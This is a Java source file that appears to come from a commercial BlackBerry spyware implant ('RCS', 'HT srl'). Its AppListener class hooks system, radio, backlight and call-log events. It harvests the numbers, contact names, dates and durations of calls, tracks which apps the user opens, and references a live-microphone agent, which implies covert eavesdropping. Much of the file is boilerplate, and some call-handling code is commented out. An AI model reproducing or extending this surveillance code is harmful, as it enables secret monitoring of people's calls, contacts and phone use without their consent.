//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry
 * File         : AppListener.java
 * Created      : 28-apr-2010
 * *************************************************/

package blackberry;

import java.util.Hashtable;
import java.util.Vector;

import net.rim.blackberry.api.phone.Phone;
import net.rim.blackberry.api.phone.PhoneCall;
import net.rim.blackberry.api.phone.PhoneListener;
import net.rim.blackberry.api.phone.phonelogs.CallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLog;
import net.rim.blackberry.api.phone.phonelogs.PhoneCallLogID;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogListener;
import net.rim.blackberry.api.phone.phonelogs.PhoneLogs;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.HolsterListener;
import net.rim.device.api.system.RadioStatusListener;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.system.SystemListener;
import net.rim.device.api.system.SystemListener2;
import blackberry.agent.Agent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.fs.Path;
import blackberry.interfaces.ApplicationObserver;
import blackberry.interfaces.BacklightObserver;
import blackberry.interfaces.BatteryStatusObserver;
import blackberry.interfaces.CallListObserver;
import blackberry.interfaces.PhoneCallObserver;
import blackberry.interfaces.Singleton;
import blackberry.log.Log;

// TODO: Auto-generated Javadoc
/**
 * The listener interface for receiving app events. The class that is interested
 * in processing a app event implements this interface, and the object created
 * with that class is registered with a component using the component's
 * <code>addAppListener<code> method. When
 * the app event occurs, that object's appropriate
 * method is invoked.
 * 
 * @see AppEvent
 */
public final class AppListener extends Listener implements RadioStatusListener,
        HolsterListener, SystemListener, SystemListener2, PhoneListener,
        PhoneLogListener, Singleton {

    private static final long GUID = 0x4e5dd52b9f50b3feL;

    //#ifdef DEBUG
    static Debug debug = new Debug("AppListener", DebugLevel.INFORMATION);
    //#endif

    static private int lastStatus;
    Vector batteryStatusObservers = new Vector();
    Vector applicationObservers = new Vector();
    Vector backlightObservers = new Vector();
    //Vector phoneCallObservers = new Vector();
    Vector callListObservers = new Vector();

    Task task;

    //private Timer applicationTimer;

    static AppListener instance;

    /**
     * Instantiates a new app listener.
     */
    private AppListener() {
        lastStatus = DeviceInfo.getBatteryStatus();
        task = Task.getInstance();

        //ScreenFake.Push();
    }

    /**
     * Gets the single instance of AppListener.
     * 
     * @return single instance of AppListener
     */
    public synchronized static AppListener getInstance() {
        if (instance == null) {
            instance = (AppListener) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                final AppListener singleton = new AppListener();
                RuntimeStore.getRuntimeStore().put(GUID, singleton);
                instance = singleton;
            }

        }
        return instance;
    }

    public synchronized void addBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        addObserver(batteryStatusObservers, observer);
    }

    public synchronized void removeBatteryStatusObserver(
            final BatteryStatusObserver observer) {
        removeObserver(batteryStatusObservers, observer);

    }

    public synchronized void addApplicationObserver(
            final ApplicationObserver observer) {
        addObserver(applicationObservers, observer);
    }

    public synchronized void removeApplicationObserver(
            final ApplicationObserver observer) {
        removeObserver(applicationObservers, observer);
    }

    public synchronized void addBacklightObserver(
            final BacklightObserver observer) {
        addObserver(backlightObservers, observer);
    }

    public synchronized void removeBacklightObserver(
            final BacklightObserver observer) {
        removeObserver(backlightObservers, observer);
    }

   /* public synchronized void addPhoneCallObserver(
            final PhoneCallObserver observer) {
        addObserver(phoneCallObservers, observer);
    }

    public synchronized void removePhoneCallObserver(
            final PhoneCallObserver observer) {
        removeObserver(phoneCallObservers, observer);
    }*/

    public synchronized void addCallListObserver(final CallListObserver observer) {
        addObserver(callListObservers, observer);
    }

    public synchronized void removeCallListObserver(
            final CallListObserver observer) {
        removeObserver(callListObservers, observer);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#baseStationChange()
     */
    public void baseStationChange() {
        //#ifdef DEBUG
        debug.info("baseStationChange");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryGood()
     */
    public void batteryGood() {
        //#ifdef DEBUG
        debug.info("batteryGood");
        //#endif

        Log.info("BatteryGood", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryLow()
     */
    public void batteryLow() {
        //#ifdef DEBUG
        debug.info("batteryLow");
        //#endif

        Log.info("BatteryLow", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    public synchronized void batteryStatusChange(final int status) {
        init();

        //#ifdef DEBUG
        debug.info("batteryStatusChange arg: " + status);
        //#endif

        final int diff = (status ^ lastStatus);

        final int size = batteryStatusObservers.size();
        for (int i = 0; i < size; i++) {

            final BatteryStatusObserver observer = (BatteryStatusObserver) batteryStatusObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            observer.onBatteryStatusChange(status, diff);
        }

        lastStatus = status;
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#batteryStatusChange(int)
     */
    /**
     * Application list change.
     * 
     * @param startedList
     *            the started list
     * @param stoppedList
     *            the stopped list
     * @param stoppedListMod
     * @param startedListMod
     */
    /*
     * public synchronized void applicationListChange( final Vector
     * startedListName, final Vector stoppedListName, final Vector
     * startedListMod, final Vector stoppedListMod) { //#ifdef DEBUG
     * debug.info("applicationListChange start: " + startedListName.size() +
     * " stopped: " + stoppedListName.size()); //#endif //#ifdef DBC
     * Check.requires(startedListName.size() == startedListMod.size(),
     * "applicationListChange"); Check.requires(stoppedListName.size() ==
     * stoppedListMod.size(), "applicationListChange"); //#endif final int size
     * = applicationListObservers.size(); for (int i = 0; i < size; i++) { final
     * ApplicationListObserver observer = (ApplicationListObserver)
     * applicationListObservers .elementAt(i); //#ifdef DEBUG
     * debug.trace("notify: " + observer); //#endif
     * observer.onApplicationListChange(startedListName, stoppedListName,
     * startedListMod, stoppedListMod); } }
     */

    public void applicationForegroundChange(String startedName,
            String stoppedName, String startedMod, String stoppedMod) {
        //#ifdef DEBUG
        debug.info("applicationForegroundChange start: " + startedName
                + " stopped: " + stoppedName);
        //#endif

        final int size = applicationObservers.size();
        for (int i = 0; i < size; i++) {

            final ApplicationObserver observer = (ApplicationObserver) applicationObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            observer.onApplicationChange(startedName, stoppedName, startedMod,
                    stoppedMod);
        }
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#inHolster()
     */
    public void inHolster() {
        init();

        //#ifdef DEBUG
        debug.info("inHolster");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.HolsterListener#outOfHolster()
     */
    public void outOfHolster() {
        init();

        //#ifdef DEBUG
        debug.info("outOfHolster");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkScanComplete(boolean
     * )
     */
    public void networkScanComplete(final boolean success) {
        init();

        //#ifdef DEBUG
        debug.info("networkScanComplete success: " + success);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkServiceChange(int,
     * int)
     */
    public void networkServiceChange(final int networkId, final int service) {
        //#ifdef DEBUG
        debug.info("networkServiceChange networkId: " + networkId
                + " service : " + service);
        //#endif
        
        // service == 0 : non c'e' segnale, service == 1030 c'e'. EVENT
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#networkStarted(int,
     * int)
     */
    public void networkStarted(final int networkId, final int service) {
        //#ifdef DEBUG
        debug.info("networkStarted networkId: " + networkId + " service : "
                + service);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.RadioStatusListener#networkStateChange(int)
     */
    public void networkStateChange(final int state) {
        //#ifdef DEBUG
        debug.info("networkStateChange state: " + state);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#pdpStateChange(int,
     * int, int)
     */
    public void pdpStateChange(final int apn, final int state, final int cause) {
        //#ifdef DEBUG
        debug.info("pdpStateChange apn: " + apn + " state: " + state
                + "cause :" + cause);
        //#endif
        
        // state : 1, spento, state == 1 acceso
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerOff()
     */
    public void powerOff() {
        Log.info("PowerOff", DebugLevel.INFORMATION);
        //#ifdef DEBUG
        debug.info("powerOff");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener#powerUp()
     */
    public void powerUp() {
        Log.info("PowerUp", DebugLevel.INFORMATION);
        //#ifdef DEBUG
        debug.info("powerUp");
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#radioTurnedOff()
     */
    public void radioTurnedOff() {
        //#ifdef DEBUG
        debug.info("radioTurnedOff");
        //#endif

        Log.info("RadioTurnedOff", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.RadioStatusListener#signalLevel(int)
     */
    public void signalLevel(final int level) {
        //#ifdef DEBUG
        debug.info("signalLevel: " + level);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#backlightStateChange(boolean)
     */
    public void backlightStateChange(final boolean on) {
        if(AgentManager.getInstance().isEnabled(Agent.AGENT_LIVE_MIC)){
            //#ifdef DEBUG
            debug.trace("backlightStateChange disabled by Agent_live_mic");
            //#endif
            return;
        }
        
        init();

        //#ifdef DEBUG
        debug.info("backlightStateChange: " + on);
        //#endif

        final int size = backlightObservers.size();
        for (int i = 0; i < size; i++) {

            final BacklightObserver observer = (BacklightObserver) backlightObservers
                    .elementAt(i);
            //#ifdef DEBUG
            debug.trace("notify: " + observer);
            //#endif

            observer.onBacklightChange(on);
        }

        if (on) {
            // riprende l'analisi degli applicativi
            // se c'e' una variazione nella lista comunica la lista agli observer
            // viene fatto con un timer
            task.resumeApplicationTimer();
        } else {
            // interrompe l'analisi degli applicativi
            task.suspendApplicationTimer();
        }

        // Verifica dei timers di task
        //Task.getInstance().verifyTimers();
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#cradleMismatch(boolean)
     */
    public void cradleMismatch(final boolean mismatch) {
        //#ifdef DEBUG
        debug.info("cradleMismatch: " + mismatch);
        //#endif
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#fastReset()
     */
    public void fastReset() {
        //#ifdef DEBUG
        debug.info("fastReset");
        //#endif

        Log.info("Fast Reset", DebugLevel.INFORMATION);
    }

    /*
     * (non-Javadoc)
     * @see net.rim.device.api.system.SystemListener2#powerOffRequested(int)
     */
    public void powerOffRequested(final int reason) {
        //#ifdef DEBUG
        debug.info("powerOffRequested: " + reason);
        //#endif

        Log.info("Power Off Requested", DebugLevel.INFORMATION);

    }

    /*
     * (non-Javadoc)
     * @see
     * net.rim.device.api.system.SystemListener2#usbConnectionStateChange(int)
     */
    public void usbConnectionStateChange(final int state) {
        //#ifdef DEBUG
        debug.info("usbConnectionStateChange: " + state);
        //#endif
    }
/*
    public void callAdded(int arg0) {
        //#ifdef DEBUG
        debug.info("callAddedd: " + arg0);
        //#endif
    }

    public void callConferenceCallEstablished(int arg0) {
        //#ifdef DEBUG
        debug.info("callConferenceCallEstablished: " + arg0);
        //#endif
    }

    public void callDirectConnectConnected(int callId) {
        //#ifdef DEBUG
        debug.info("callDirectConnectConnected: " + callId);
        //#endif
    }

    public void callDirectConnectDisconnected(int callId) {
        //#ifdef DEBUG
        debug.info("callDirectConnectDisconnected: " + callId);
        //#endif
    }

    public void callEndedByUser(int callId) {
        //#ifdef DEBUG
        debug.info("callEndedByUser: " + callId);
        //#endif
    }

    public void callFailed(int callId, int reason) {
        //#ifdef DEBUG
        debug.info("callFailed: " + callId);
        //#endif

    }

    public void callHeld(int callId) {
        //#ifdef DEBUG
        debug.info("callHeld: " + callId);
        //#endif
    }

    public void callInitiated(int callId) {
        //#ifdef DEBUG
        debug.info("callInitiated: " + callId);
        //#endif

        init();

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        if (outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallInitiated(callId, phoneNumber);
            }
        }
    }

    public void callRemoved(int callId) {
        //#ifdef DEBUG
        debug.info("callRemoved: " + callId);
        //#endif
    }

    public void callResumed(int callId) {
        //#ifdef DEBUG
        debug.info("callResumed: " + callId);
        //#endif
    }

    public void callWaiting(int callId) {
        //#ifdef DEBUG
        debug.info("callWaiting: " + callId);
        //#endif
    }

    public void conferenceCallDisconnected(int callId) {
        //#ifdef DEBUG
        debug.info("conferenceCallDisconnected: " + callId);
        //#endif
    }

    public void callIncoming(int callId) {
        init();

        //#ifdef DEBUG
        debug.info("callIncoming: " + callId);
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallIncoming(callId, phoneNumber);
            }
        }

        synchronized (callingHistory) {
            callingHistory.put(new Integer(callId), phoneNumber);
        }

    }

    public void callConnected(int callId) {
        init();

        //#ifdef DEBUG
        debug.info("callConnected: " + callId);
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber();
        final boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallConnected(callId, phoneNumber);
            }
        }

    }

    public void callAnswered(int callId) {
        init();

        //#ifdef DEBUG
        debug.info("callAnswered: " + callId);
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        final String phoneNumber = phoneCall.getDisplayPhoneNumber().trim();
        final boolean outgoing = phoneCall.isOutgoing();

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallAnswered(callId, phoneNumber);
            }
        }

    }

    Hashtable callingHistory = new Hashtable();

    public void callDisconnected(int callId) {
        init();
        boolean outgoing = false;
        //#ifdef DEBUG
        debug.info("callDisconnected: " + callId);
        //#endif

        final PhoneCall phoneCall = Phone.getCall(callId);
        String phoneNumber = null;

        if (phoneCall != null) {

            phoneNumber = phoneCall.getDisplayPhoneNumber();
            outgoing = phoneCall.isOutgoing();

        } else {

            synchronized (callingHistory) {
                if (callingHistory.containsKey(new Integer(callId))) {
                    phoneNumber = (String) callingHistory.get(new Integer(
                            callId));
                    callingHistory.remove(new Integer(callId));
                }
            }

            //#ifdef DEBUG
            debug.trace("callDisconnected phoneNumber: " + phoneNumber);
            //#endif
        }

        if (!outgoing) {
            final int size = phoneCallObservers.size();
            for (int i = 0; i < size; i++) {

                final PhoneCallObserver observer = (PhoneCallObserver) phoneCallObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.onCallDisconnected(callId, phoneNumber);
            }
        }
    }*/

    public void callLogAdded(CallLog callLog) {
        init();

        final String notes = callLog.getNotes();
        //#ifdef DEBUG
        debug.trace("callLogAdded: " + callLog.toString() + " notes: " + notes);
        //#endif            

        final PhoneLogs phoneLogs = PhoneLogs.getInstance();

        if (PhoneCallLog.class.isAssignableFrom(callLog.getClass())) {
            final PhoneCallLog phoneCallLog = (PhoneCallLog) callLog;
            final PhoneCallLogID logID = phoneCallLog.getParticipant();
            //#ifdef DEBUG
            debug.trace("date: " + callLog.getDate() + " number: "
                    + logID.getNumber());
            //#endif 

            final int type = phoneCallLog.getType();
            final int status = callLog.getStatus();

            String phoneNumber = "";
            String phoneName = null;
            final PhoneCallLogID partecipant = phoneCallLog.getParticipant();
            if (partecipant != null) {
                phoneNumber = partecipant.getNumber();
                phoneName = partecipant.getName();
            }

            if (phoneName == null) {
                phoneName = "";
            }

            //#ifdef DEBUG
            debug.info("number: " + phoneNumber + " type: " + type
                    + " status: " + status);
            //#endif

            boolean outgoing = false;
            boolean missed = false;

            if (type == PhoneCallLog.TYPE_PLACED_CALL) {
                outgoing = true;
            } else if (type == PhoneCallLog.TYPE_RECEIVED_CALL) {
                outgoing = false;
            }

            if (type == PhoneCallLog.TYPE_MISSED_CALL_OPENED
                    || type == PhoneCallLog.TYPE_MISSED_CALL_UNOPENED) {
                outgoing = false;
            }

            missed = phoneCallLog.getDuration() == 0;

            final int size = callListObservers.size();
            for (int i = 0; i < size; i++) {

                final CallListObserver observer = (CallListObserver) callListObservers
                        .elementAt(i);
                //#ifdef DEBUG
                debug.trace("notify: " + observer);
                //#endif

                observer.callLogAdded(phoneNumber, phoneName,
                        callLog.getDate(), phoneCallLog.getDuration(),
                        outgoing, missed);

            }
        }
    }

    public void callLogRemoved(CallLog arg0) {
        init();

        //#ifdef DEBUG
        debug.trace("callLogRemoved: " + arg0.getDate());
        //#endif
    }

    public void callLogUpdated(CallLog arg0, CallLog arg1) {

    }

    public void reset() {
        Log.info("Reset", DebugLevel.INFORMATION);
    }

    private synchronized void init() {
        if (!Path.isInizialized()) {
            Path.makeDirs();
        }
        Debug.init();
    }
    
    /******************** Phone *******************/

    public void callAdded(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callAnswered(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callConferenceCallEstablished(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callConnected(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callDirectConnectConnected(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callDirectConnectDisconnected(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callDisconnected(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callEndedByUser(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callFailed(int callId, int reason) {
        // TODO Auto-generated method stub
        
    }

    public void callHeld(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callIncoming(int callId) {
        init();
        //#ifdef DEBUG
        debug.trace("callIncoming");
        //#endif
    }

    public void callInitiated(int callid) {
        // TODO Auto-generated method stub
        
    }

    public void callRemoved(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callResumed(int callId) {
        // TODO Auto-generated method stub
        
    }

    public void callWaiting(int callid) {
        // TODO Auto-generated method stub
        
    }

    public void conferenceCallDisconnected(int callId) {
        // TODO Auto-generated method stub
        
    }

}
